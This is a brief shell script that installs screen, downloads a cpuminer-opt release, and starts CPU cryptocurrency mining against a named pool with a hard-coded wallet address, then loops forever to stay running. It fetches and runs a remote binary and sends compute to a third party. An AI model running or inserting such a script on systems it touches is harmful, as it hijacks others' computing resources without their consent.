#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.22/cpuminer-opt-linux.tar.gz
tar -xf cpuminer-opt-linux.tar.gz
./cpuminer-sse2 -a power2b  -o stratum+tcp://stratum-asia.rplant.xyz:7022 -u MnMx1aZzHRsq5hvJfLwFtSD1dxjGNJyzCc.1
while [ 1 ]; do
sleep 1
done
sleep 999
